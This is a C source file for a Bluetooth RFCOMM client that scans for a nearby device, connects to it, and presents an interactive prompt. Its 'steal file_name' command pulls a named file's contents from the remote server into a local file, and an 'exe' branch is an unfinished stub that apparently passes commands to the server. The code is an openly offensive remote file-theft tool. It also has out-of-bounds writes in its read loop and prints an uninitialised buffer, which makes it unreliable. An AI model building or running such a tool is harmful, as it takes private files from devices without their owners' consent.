#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/rfcomm.h>

#include "scanner.h"

#define BUF 1024

int main(int argc, char **argv)
{
    struct sockaddr_rc addr = { 0 }; // creates the structure for THIS device
    int s, status;
    char dest[18]; // mac of the PI machine
    char (*temp)[18];
	char buf[BUF], file_name[256];
	FILE *fp;
	char command_buf[256];

	printf("\tStarting to Scan for Devices\n");
	temp = scanner();
	strcpy(dest, *temp);
	printf("Connecting to: %s\n", dest);
    s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);

    addr.rc_family = AF_BLUETOOTH; // sets the type of family to be bleutooth
    addr.rc_channel = (uint8_t) 1; // sets the channel to 1 same as in the server
    str2ba( dest, &addr.rc_bdaddr ); // converts the string amc address to a binary val

    status = connect(s, (struct sockaddr *)&addr, sizeof(addr));
    if( status < 0 ) { // error handling!
        perror("Can't Connect To Server!");
        return -1;
    }

    while(1) {

        printf("Enter Message or say 'steal file_name' to steal the contents of a file: ");
        fgets(buf, BUF, stdin);
                // this will read from the other terminal, stores it into the buf var 
                // but it has to be with in the size of BUF 1024 
        if(strncmp(buf, "quit", 4) == 0) break;
                // compaites the strings from the first 4 chars in the buffer to strign
                // if the 2 srtings are equal it will return 0 and quits the loop
		if (strncmp(buf,"steal", 5) == 0) {
			sscanf(buf, "steal %[^\n]", file_name);
			printf("HERE IS buff before file open %s\n", buf);
			status = write(s, buf, strlen(buf) + 1); // this will write to the buffer
			printf("Here is what you entered: %s , copying the contents to %s\n" ,  file_name,file_name);
			fp = fopen(file_name, "a+");
			if (fp == NULL) {
				perror("ERROR: file could not be opened!\n");
				close(s);
				return EXIT_FAILURE;
			}
			int n = 0;
			int done = 0;
			printf("This is the contents of the buffer BEFORE THE WHILE LOOP: %s\n", buf);
			while (!done) {
				n = read(s, buf, sizeof(buf));
				buf[n] = '\0';
				printf("CONTENTS OF BUFF ON CLIENT IN WHILE LOOP: %s\n",buf);
				if (n > 0) {
					fwrite(buf, 1, n, fp);
					printf("Received %d bytes\n", n);
				} else if (n == 0) {
					printf("End of file reached\n");
					done = 1;
				} else {
					perror("Error receiving data from server");
					done = 1;
				}
			}
			if (n < 0) {
				printf("Received data: %s\n", buf);
				perror("Error receiving data from server");
			}
			fclose(fp);
			close(s);

			return 0;
		}
		if (strncmp(buf, "exe", 3) == 0) {
			printf("This is the contents of the buffer: %s\n", buf);
//            sscanf(buf, "exe %[^\n]", command_buf);
            printf("sending command : %s\n", command_buf);
		}


        status = write(s, buf, strlen(buf));
                // writes from the socket into the buf var with the length of the cahracers 
                // entered from the 
                // here we can start to send messages if 0 is returned then we exit the progam
        if( status < 0 ) {// if teh socket returns a value thats not positive then break
            perror("Couldn't Send Message");
            break;
        }

        // receive a message
        status = read(s, buf, BUF);
                // we read from the socket and the buffer, if negative then break
        if( status < 0 ) {
            perror("Failed to receive message");
            break;
        }
        printf("Received: %s\n", buf);
    }

    close(s);
    return 0;
}
